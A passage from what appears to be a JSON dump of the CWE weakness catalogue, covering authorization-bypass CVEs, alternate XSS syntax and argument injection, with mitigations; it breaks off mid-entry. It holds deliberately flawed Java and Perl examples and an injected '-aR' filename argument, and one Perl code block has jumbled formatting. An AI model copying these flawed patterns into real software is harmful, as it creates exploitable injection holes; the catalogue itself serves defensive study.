Junos OS on the SRX Series Services Gateways may allow an attacker to bypass Juniper Deep Packet Inspection (JDPI) rules and access unauthorized networks or resources, when 'no-syn-check' is enabled on the device. While JDPI correctly classifies out-of-state asymmetric TCP flows as the dynamic-application UNKNOWN, this classification is not provided to the policy module properly and hence traffic continues to use the pre-id-default-policy, which is more permissive, causing the firewall to allow traffic to be forwarded that should have been denied. This issue only occurs when 'set security flow tcp-session no-syn-check' is configured on the device. This issue affects Juniper Networks Junos OS on SRX Series: 18.4 versions prior to 18.4R2-S10, 18.4R3-S10; 19.1 versions prior to 19.1R3-S8; 19.2 versions prior to 19.2R1-S8, 19.2R3-S4; 19.3 versions prior to 19.3R3-S3; 19.4 versions prior to 19.4R3-S5; 20.1 versions prior to 20.1R3-S1; 20.2 versions prior to 20.2R3-S2; 20.3 versions prior to 20.3R3-S1; 20.4 versions prior to 20.4R2-S2, 20.4R3; 21.1 versions prior to 21.1R2-S2, 21.1R3; 21.2 versions prior to 21.2R2. This issue does not affect Juniper Networks Junos OS versions prior to 18.4R1."}, {"Reference": "CVE-2022-22978", "Description": "In spring security versions prior to 5.4.11+, 5.5.7+ , 5.6.4+ and older unsupported versions, RegexRequestMatcher can easily be misconfigured to be bypassed on some servlet containers. Applications using RegexRequestMatcher with `.` in the regular expression are possibly vulnerable to an authorization bypass."}, {"Reference": "CVE-2022-23009", "Description": "On BIG-IQ Centralized Management 8.x before 8.1.0, an authenticated administrative role user on a BIG-IQ managed BIG-IP device can access other BIG-IP devices managed by the same BIG-IQ system. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated."}, {"Reference": "CVE-2022-24189", "Description": "The user_token authorization header on the Ourphoto App version 1.4.1 /apiv1/* end-points is not implemented properly. Removing the value causes all requests to succeed, bypassing authorization and session management. The impact of this vulnerability allows an attacker POST api calls with other users unique identifiers and enumerate information of all other end-users."}, {"Reference": "CVE-2022-24306", "Description": "Zoho ManageEngine SharePoint Manager Plus before 4329 allows account takeover because authorization is mishandled."}, {"Reference": "CVE-2022-31178", "Description": "eLabFTW is an electronic lab notebook manager for research teams. A vulnerability was discovered which allows a logged in user to read a template without being authorized to do so. This vulnerability has been patched in 4.3.4. Users are advised to upgrade. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-31252", "Description": "A Incorrect Authorization vulnerability in chkstat of SUSE Linux Enterprise Server 12-SP5; openSUSE Leap 15.3, openSUSE Leap 15.4, openSUSE Leap Micro 5.2 did not consider group writable path components, allowing local attackers with access to a group what can write to a location included in the path to a privileged binary to influence path resolution. This issue affects: SUSE Linux Enterprise Server 12-SP5 permissions versions prior to 20170707. openSUSE Leap 15.3 permissions versions prior to 20200127. openSUSE Leap 15.4 permissions versions prior to 20201225. openSUSE Leap Micro 5.2 permissions versions prior to 20181225."}, {"Reference": "CVE-2022-32532", "Description": "Apache Shiro before 1.9.1, A RegexRequestMatcher can be misconfigured to be bypassed on some servlet containers. Applications using RegExPatternMatcher with `.` in the regular expression are possibly vulnerable to an authorization bypass."}, {"Reference": "CVE-2022-34814", "Description": "Jenkins Request Rename Or Delete Plugin 1.1.0 and earlier does not correctly perform a permission check in an HTTP endpoint, allowing attackers with Overall/Read permission to view an administrative configuration page listing pending requests."}, {"Reference": "CVE-2022-35487", "Description": "Zammad 5.2.0 suffers from Incorrect Access Control. Zammad did not correctly perform authorization on certain attachment endpoints. This could be abused by an unauthenticated attacker to gain access to attachments, such as emails or attached files."}, {"Reference": "CVE-2022-36634", "Description": "An access control issue in ZKTeco ZKBioSecurity V5000 3.0.5_r allows attackers to arbitrarily create admin users via a crafted HTTP request."}, {"Reference": "CVE-2022-3880", "Description": "The Disable Json API, Login Lockdown, XMLRPC, Pingback, Stop User Enumeration Anti Hacker Scan WordPress plugin before 4.20 does not have proper authorisation and CSRF in an AJAX action, allowing any authenticated users, such as subscriber to call it and install and activate arbitrary plugins from wordpress.org"}, {"Reference": "CVE-2022-3881", "Description": "The WP Tools Increase Maximum Limits, Repair, Server PHP Info, Javascript errors, File Permissions, Transients, Error Log WordPress plugin before 3.43 does not have proper authorisation and CSRF in an AJAX action, allowing any authenticated users, such as subscriber to call it and install and activate arbitrary plugins from wordpress.org"}, {"Reference": "CVE-2022-3883", "Description": "The Block Bad Bots and Stop Bad Bots Crawlers and Spiders and Anti Spam Protection WordPress plugin before 7.24 does not have proper authorisation and CSRF in an AJAX action, allowing any authenticated users, such as subscriber to call it and install and activate arbitrary plugins from wordpress.org"}, {"Reference": "CVE-2022-39029", "Description": "Smart eVision has inadequate authorization for the database query function. A remote attacker with general user privilege, who is not explicitly authorized to access the information, can access sensitive information."}, {"Reference": "CVE-2022-39030", "Description": "smart eVision has inadequate authorization for system information query function. An unauthenticated remote attacker, who is not explicitly authorized to access the information, can access sensitive information."}, {"Reference": "CVE-2022-39031", "Description": "Smart eVision has insufficient authorization for task acquisition function. An unauthorized remote attacker can exploit this vulnerability to acquire the Session IDs of other general users only."}, {"Reference": "CVE-2022-34180", "Description": "Jenkins Embeddable Build Status Plugin 2.0.3 and earlier does not correctly perform the ViewStatus permission check in the HTTP endpoint it provides for \"unprotected\" status badge access, allowing attackers without any permissions to obtain the build status badge icon for any attacker-specified job and/or build."}, {"Reference": "CVE-2022-31087", "Description": "LDAP Account Manager (LAM) is a webfrontend for managing entries (e.g. users, groups, DHCP settings) stored in an LDAP directory. In versions prior to 8.0 the tmp directory, which is accessible by /lam/tmp/, allows interpretation of .php (and .php5/.php4/.phpt/etc) files. An attacker capable of writing files under www-data privileges can write a web-shell into this directory, and gain a Code Execution on the host. This issue has been fixed in version 8.0. Users unable to upgrade should disallow executing PHP scripts in (/var/lib/ldap-account-manager/)tmp directory."}, {"Reference": "CVE-2022-2354", "Description": "The WP-DBManager WordPress plugin before 2.80.8 does not prevent administrators from running arbitrary commands on the server in multisite installations, where only super-administrators should."}, {"Reference": "CVE-2022-32310", "Description": "An access control issue in Ingredient Stock Management System v1.0 allows attackers to take over user accounts via a crafted POST request to /isms/classes/Users.php."}, {"Reference": "CVE-2022-21678", "Description": "Discourse is an open source discussion platform. Prior to version 2.8.0.beta11 in the `tests-passed` branch, version 2.8.0.beta11 in the `beta` branch, and version 2.7.13 in the `stable` branch, the bios of users who made their profiles private were still visible in the `<meta>` tags on their users' pages. The problem is patched in `tests-passed` version 2.8.0.beta11, `beta` version 2.8.0.beta11, and `stable` version 2.7.13 of Discourse."}, {"Reference": "CVE-2022-2462", "Description": "The Transposh WordPress Translation plugin for WordPress is vulnerable to sensitive information disclosure to unauthenticated users in versions up to, and including, 1.0.8.1. This is due to insufficient permissions checking on the 'tp_history' AJAX action and insufficient restriction on the data returned in the response. This makes it possible for unauthenticated users to exfiltrate usernames of individuals who have translated text."}, {"Reference": "CVE-2022-31139", "Description": "UnsafeAccessor (UA) is a bridge to access jdk.internal.misc.Unsafe & sun.misc.Unsafe. Normally, if UA is loaded as a named module, the internal data of UA is protected by JVM and others can only access UA via UA's standard API. The main application can set up `SecurityCheck.AccessLimiter` for UA to limit access to UA. Starting with version 1.4.0 and prior to version 1.7.0, when `SecurityCheck.AccessLimiter` is set up, untrusted code can access UA without limitation, even when UA is loaded as a named module. This issue does not affect those for whom `SecurityCheck.AccessLimiter` is not set up. Version 1.7.0 contains a patch."}, {"Reference": "CVE-2022-31190", "Description": "DSpace open source software is a repository application which provides durable access to digital resources. dspace-xmlui is a UI component for DSpace. In affected versions metadata on a withdrawn Item is exposed via the XMLUI \"mets.xml\" object, as long as you know the handle/URL of the withdrawn Item. This vulnerability only impacts the XMLUI. Users are advised to upgrade to version 6.4 or newer."}, {"Reference": "CVE-2022-41944", "Description": "Discourse is an open-source discussion platform. In stable versions prior to 2.8.12 and beta or tests-passed versions prior to 2.9.0.beta.13, under certain conditions, a user can see notifications for topics they no longer have access to. If there is sensitive information in the topic title, it will therefore have been exposed. This issue is patched in stable version 2.8.12, beta version 2.9.0.beta13, and tests-passed version 2.9.0.beta13. There are no workarounds available."}, {"Reference": "CVE-2022-42724", "Description": "app/Controller/UsersController.php in MISP before 2.4.164 allows attackers to discover role names (this is information that only the site admin should have)."}, {"Reference": "CVE-2021-41571", "Description": "In Apache Pulsar it is possible to access data from BookKeeper that does not belong to the topics accessible by the authenticated user. The Admin API get-message-by-id requires the user to input a topic and a ledger id. The ledger id is a pointer to the data, and it is supposed to be a valid it for the topic. Authorisation controls are performed against the topic name and there is not proper validation the that ledger id is valid in the context of such ledger. So it may happen that the user is able to read from a ledger that contains data owned by another tenant. This issue affects Apache Pulsar Apache Pulsar version 2.8.0 and prior versions; Apache Pulsar version 2.7.3 and prior versions; Apache Pulsar version 2.6.4 and prior versions."}]}
{"ID": "87", "Name": "Improper Neutralization of Alternate XSS Syntax", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product does not neutralize or incorrectly neutralizes user-controlled input for alternate script syntax.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "79", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Read Application Data", "Execute Unauthorized Code or Commands"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Resolve all input to absolute or canonical representations before processing."}, {"Phase": ["Implementation"], "Description": "Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended."}, {"MitigationID": "MIT-30.1", "Phase": ["Implementation"], "Strategy": "Output Encoding", "Description": "\n\nUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.\n\n\nThe problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.\n"}, {"MitigationID": "MIT-43", "Phase": ["Implementation"], "Description": "With Struts, write all data from form beans with the bean's filter attribute set to true."}, {"MitigationID": "MIT-31", "Phase": ["Implementation"], "Strategy": "Attack Surface Reduction", "Description": "To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.", "Effectiveness": "Defense in Depth"}], "DemonstrativeExamples": [{"ID": "DX-141", "Entries": [{"IntroText": "In the following example, an XSS neutralization method intends to replace script tags in user-supplied input with a safe equivalent:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic String preventXSS(String input, String mask) {\n\t\treturn input.replaceAll(\"script\", mask);\n\t}\n```"}, {"BodyText": "The code only works when the \"script\" tag is in all lower-case, forming an incomplete denylist (CWE-184). Equivalent tags such as \"SCRIPT\" or \"ScRiPt\" will not be neutralized by this method, allowing an XSS attack."}]}], "ObservedExamples": [{"Reference": "CVE-2002-0738", "Description": "XSS using \"&={script}\".", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0738"}], "RelatedAttackPatterns": ["199"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "88", "Name": "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product constructs a string for a command to be executed by a separate component\nin another control sphere, but it does not properly delimit the\nintended arguments, options, or switches within that command string.", "ExtendedDescription": "\n\nWhen creating commands using interpolation into a string, developers may assume that only the arguments/options that they specify will be processed. This assumption may be even stronger when the programmer has encoded the command in a way that prevents separate commands from being provided maliciously, e.g. in the case of shell metacharacters. When constructing the command, the developer may use whitespace or other delimiters that are required to separate arguments when the command. However, if an attacker can provide an untrusted input that contains argument-separating delimiters, then the resulting command will have more arguments than intended by the developer. The attacker may then be able to change the behavior of the command. Depending on the functionality supported by the extraneous arguments, this may have security-relevant consequences.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "77", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "74", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "77", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "77", "ViewID": "1340", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "PHP", "Prevalence": "Often"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability", "Other"], "Impact": ["Execute Unauthorized Code or Commands", "Alter Execution Logic", "Read Application Data", "Modify Application Data"], "Note": "An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Strategy": "Parameterization", "Description": "Where possible, avoid building a single string that contains the command and its arguments. Some languages or frameworks have functions that support specifying independent arguments, e.g. as an array, which is used to automatically perform the appropriate quoting or escaping while building the command. For example, in PHP, escapeshellarg() can be used to escape a single argument to system(), or exec() can be called with an array of arguments. In C, code can often be refactored from using system() - which accepts a single string - to using exec(), which requires separate function arguments for each parameter.", "Effectiveness": "High"}, {"Phase": ["Architecture and Design"], "Strategy": "Input Validation", "Description": "Understand all the potential areas where untrusted inputs can enter your product: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces."}, {"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n"}, {"Phase": ["Implementation"], "Description": "Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained."}, {"Phase": ["Implementation"], "Description": "\n\nInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.\n\n\nConsider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.\n"}, {"Phase": ["Implementation"], "Description": "When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so."}, {"Phase": ["Implementation"], "Description": "When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined."}, {"Phase": ["Testing"], "Description": "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."}, {"Phase": ["Testing"], "Description": "Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results."}], "DemonstrativeExamples": [{"ID": "DX-150", "Entries": [{"IntroText": "Consider the following program. It intends to perform an \"ls -l\" on an input filename. The validate_name() subroutine performs validation on the input to make sure that only alphanumeric and \"-\" characters are allowed, which avoids path traversal (CWE-22) and OS command injection (CWE-78) weaknesses. Only filenames like \"abc\" or \"d-e-f\" are intended to be allowed."}, {"Nature": "Bad", "Language": "Perl", "ExampleCode": "```\n\t my $arg = GetArgument(\"filename\");\n\t do_listing($arg);\n\t sub do_listing {\n\t\t my($fname) = @_;\n\t\t if (! validate_name($fname)) {\n\t\t\t print \"Error: name is not well-formed!\\n\";\n\t\t\t return;\n\t\t }\n```\n# build command* \n\t\t my $cmd = \"/bin/ls -l $fname\";\n\t\t system($cmd);\n\t\t } \n\t\n\t sub validate_name {\n\t\n\t```\n\t\t my($name) = @_;\n\t\t if ($name =~ /^[\\w\\-]+$/) {\n\t\t\t return(1);\n\t\t }\n\t\t else {\n\t\t\t return(0);\n\t\t }\n\t } \n```"}, {"BodyText": "However, validate_name() allows filenames that begin with a \"-\". An adversary could supply a filename like \"-aR\", producing the \"ls -l -aR\" command (CWE-88), thereby getting a full recursive listing of the entire directory and all of its sub-directories.\n\n\nThere are a couple possible mitigations for this weakness. One would be to refactor the code to avoid using system() altogether, instead relying on internal functions.\n\n\nAnother option could be to add a \"--\" argument to the ls command, such as \"ls -l --\", so that any remaining arguments are treated as filenames, causing any leading \"-\" to be treated as part of a filename instead of another option.\n\n\nAnother fix might be to change the regular expression used in validate_name to force the first character of the filename to be a letter or number, such as:"}, {"Nature": "Good", "Language": "Perl", "ExampleCode": "```\n\t if ($name =~ /^\\w[\\w\\-]+$/) ... \n```"}]}, {"Entries": [{"IntroText": "CVE-2016-10033 / [REF-1249] provides a useful real-world example of this weakness within PHPMailer."}, {"BodyText": "The program calls PHP's mail() function to compose and send mail. The fifth argument to mail() is a set of parameters. The program intends to provide a \"-fSENDER\" parameter, where SENDER is expected to be a well-formed email address. The program has already validated the e-mail address before invoking mail(), but there is a lot of flexibility in what constitutes a well-formed email address, including whitespace. With some additional allowed characters to perform some escaping, the adversary can specify an additional \"-o\" argument (listing an output file) and a \"-X\" argument (giving a program to execute). Additional details for this kind of exploit are in [REF-1250]."}]}], "ObservedExamples": [{"Reference": "CVE-2022-36069", "Description": "Python-based dependency management tool avoids OS command injection when generating Git commands but allows injection of optional arguments with input beginning with a dash (CWE-88), potentially allowing for code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-36069"}, {"Reference": "CVE-1999-0113", "Description": "Canonical Example - \"-froot\" argument is passed on to another program, where the \"-f\" causes execution as user \"root\"", "Link": "https://www.cve.org/CVERecord?id=CVE-1999-0113"}, {"Reference": "CVE-2001-0150", "Description": "Web browser executes Telnet sessions using command line arguments that are specified by the web site, which could allow remote attackers to execute arbitrary commands.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0150"}, {"Reference": "CVE-2001-0667", "Description": "Web browser allows remote attackers to execute commands by spawning Telnet with a log file option on the command line and writing arbitrary code into an executable file which is later executed.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0667"}, {"Reference": "CVE-2002-0985", "Description": "Argument injection vulnerability in the mail function for PHP may allow attackers to bypass safe mode restrictions and modify command line arguments to the MTA (e.g. sendmail) possibly executing commands.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0985"}, {"Reference": "CVE-2003-0907", "Description": "Help and Support center in windows does not properly validate HCP URLs, which allows remote attackers to execute arbitrary code via quotation marks in an \"hcp://\" URL.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0907"}, {"Reference": "CVE-2004-0121", "Description": "Mail client does not sufficiently filter parameters of mailto: URLs when using them as arguments to mail executable, which allows remote attackers to execute arbitrary programs.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0121"}, {"Reference": "CVE-2004-0473", "Description": "Web browser doesn't filter \"-\" when invoking various commands, allowing command-line switches to be specified.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0473"}, {"Reference": "CVE-2004-0480", "Description": "Mail client allows remote attackers to execute arbitrary code via a URI that uses a UNC network share pathname to provide an alternate configuration file.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0480"}, {"Reference": "CVE-2004-0489", "Description": "SSH URI handler for web browser allows remote attackers to execute arbitrary code or conduct port forwarding via the a command line option.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0489"}, {"Reference": "CVE-2004-0411", "Description": "Web browser doesn't filter \"-\" when invoking various commands, allowing command-line switches to be specified.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0411"}, {"Reference": "CVE-2005-4699", "Description": "Argument injection vulnerability in TellMe 1.2 and earlier allows remote attackers to modify command line arguments for the Whois program and obtain sensitive information via \"--\" style options in the q_Host parameter.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-4699"}, {"Reference": "CVE-2006-1865", "Description": "Beagle before 0.2.5 can produce certain insecure command lines to launch external helper applications while indexing, which allows attackers to execute arbitrary commands. NOTE: it is not immediately clear whether this issue involves argument injection, shell metacharacters, or other issues.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-1865"}, {"Reference": "CVE-2006-2056", "Description": "Argument injection vulnerability in Internet Explorer 6 for Windows XP SP2 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2056"}, {"Reference": "CVE-2006-2057", "Description": "Argument injection vulnerability in Mozilla Firefox 1.0.6 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2057"}, {"Reference": "CVE-2006-2058", "Description": "Argument injection vulnerability in Avant Browser 10.1 Build 17 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via \" (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2058"}, {"Reference": "CVE-2006-2312", "Description": "Argument injection vulnerability in the URI handler in Skype 2.0.*.104 and 2.5.*.0 through 2.5.*.78 for Windows allows remote authorized attackers to download arbitrary files via a URL that contains certain command-line switches.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2312"}, {"Reference": "CVE-2006-3015", "Description": "Argument injection vulnerability in WinSCP 3.8.1 build 328 allows remote attackers to upload or download arbitrary files via encoded spaces and double-quote characters in a scp or sftp URI.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-3015"}, {"Reference": "CVE-2006-4692", "Description": "Argument injection vulnerability in the Windows Object Packager (packager.exe) in Microsoft Windows XP SP1 and SP2 and Server 2003 SP1 and earlier allows remote user-assisted attackers to execute arbitrary commands via a crafted file with a \"/\" (slash) character in the filename of the Command Line property, followed by a valid file extension, which causes the command before the slash to be executed, aka \"Object Packager Dialogue Spoofing Vulnerability.\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4692"}, {"Reference": "CVE-2006-6597", "Description": "Argument injection vulnerability in HyperAccess 8.4 allows user-assisted remote attackers to execute arbitrary vbscript and commands via the /r option in a telnet:// URI, which is configured to use hawin32.exe.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6597"}, {"Reference": "CVE-2007-0882", "Description": "Argument injection vulnerability in the telnet daemon (in.telnetd) in Solaris 10 and 11 (SunOS 5.10 and 5.11) misinterprets certain client \"-f\" sequences as valid requests for the login program to skip authentication, which allows remote attackers to log into certain accounts, as demonstrated by the bin account.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0882"}, {"Reference": "CVE-2001-1246", "Description": "Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1246"}, {"Reference": "CVE-2019-13475", "Description": "Argument injection allows execution of arbitrary commands by injecting a \"-exec\" option, which is executed by the command.", "Link": "https://www.cve.org/CVERecord?id=CVE-2019-13475"}, {"Reference": "CVE-2016-10033", "Description": "Argument injection in mail-processing function allows writing unxpected files and executing programs using tecnically-valid email addresses that insert \"-o\" and \"-X\" switches.", "Link": "https://www.cve.org/CVERecord?id=CVE-2016-10033"}], "AffectedResources": ["System Process"], "RelatedAttackPatterns": ["137", "174", "41", "460", "88"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "At one layer of abstraction, this can overlap other weaknesses that have whitespace problems, e.g. injection of javascript into attributes of HTML tags."}], "Top25Examples": [{"Reference": "CVE-2022-21187", "Description": "The package libvcs before 0.11.1 are vulnerable to Command Injection via argument injection. When calling the update_repo function (when using hg), the url parameter is passed to the hg clone command. By injecting some hg options it was possible to get arbitrary command execution."}, {"Reference": "CVE-2022-21223", "Description": "The package cocoapods-downloader before 1.6.2 are vulnerable to Command Injection via hg argument injection. When calling the download function (when using hg), the url (and/or revision, tag, branch) is passed to the hg clone command in a way that additional flags can be set. The additional flags can be used to perform a command injection."}, {"Reference": "CVE-2022-21235", "Description": "The package github.com/masterminds/vcs before 1.13.3 are vulnerable to Command Injection via argument injection. When hg is executed, argument strings are passed to hg in a way that additional flags can be set. The additional flags can be used to perform a command injection."}, {"Reference": "CVE-2022-24433", "Description": "The package simple-git before 3.3.0 are vulnerable to Command Injection via argument injection. When calling the .fetch(remote, branch, handlerFn) function, both the remote and branch parameters are passed to the git fetch subcommand. By injecting some git options it was possible to get arbitrary command execution."}, {"Reference": "CVE-2022-24440", "Description": "The package cocoapods-downloader before 1.6.0, from 1.6.2 and before 1.6.3 are vulnerable to Command Injection via git argument injection. When calling the Pod::Downloader.preprocess_options function and using git, both the git and branch parameters are passed to the git ls-remote subcommand in a way that additional flags can be set. The additional flags can be used to perform a command injection."}, {"Reference": "CVE-2022-25648", "Description": "The package git before 1.11.0 are vulnerable to Command Injection via git argument injection. When calling the fetch(remote = 'origin', opts = {}) function, the remote parameter is passed to the git fetch subcommand in a way that additional flags can be set. The additional flags can be used to perform a command injection."}, {"Reference": "CVE-2022-25766", "Description": "The package ungit before 1.5.20 are vulnerable to Remote Code Execution (RCE) via argument injection. The issue occurs when calling the /api/fetch endpoint. User controlled values (remote and ref) are passed to the git fetch command. By injecting some git options it was possible to get arbitrary command execution."}, {"Reference": "CVE-2022-25865", "Description": "The package workspace-tools before 0.18.4 are vulnerable to Command Injection via git argument injection. When calling the fetchRemoteBranch(remote: string, remoteBranch: string, cwd: string) function, both the remote and remoteBranch parameters are passed to the git fetch subcommand in a way that additional flags can be set. The additional flags can be used to perform a command injection."}, {"Reference": "CVE-2022-25866", "Description": "The package czproject/git-php before 4.0.3 are vulnerable to Command Injection via git argument injection. When calling the isRemoteUrlReadable($url, array $refs = NULL) function, both the url and refs parameters are passed to the git ls-remote subcommand in a way that additional flags can be set. The additional flags can be used to perform a command injection."}, {"Reference": "CVE-2022-25900", "Description": "All versions of package git-clone are vulnerable to Command Injection due to insecure usage of the --upload-pack feature of git."}, {"Reference": "CVE-2022-26532", "Description": "A argument injection vulnerability in the 'packet-trace' CLI command of Zyxel USG/ZyWALL series firmware versions 4.09 through 4.71, USG FLEX series firmware versions 4.50 through 5.21, ATP series firmware versions 4.32 through 5.21, VPN series firmware versions 4.30 through 5.21, NSG series firmware versions 1.00 through 1.33 Patch 4, NXC2500 firmware version 6.10(AAIG.3) and earlier versions, NAP203 firmware version 6.25(ABFA.7) and earlier versions, NWA50AX firmware version 6.25(ABYW.5) and earlier versions, WAC500 firmware version 6.30(ABVS.2) and earlier versions, and WAX510D firmware version 6.30(ABTF.2) and earlier versions, that could allow a local authenticated 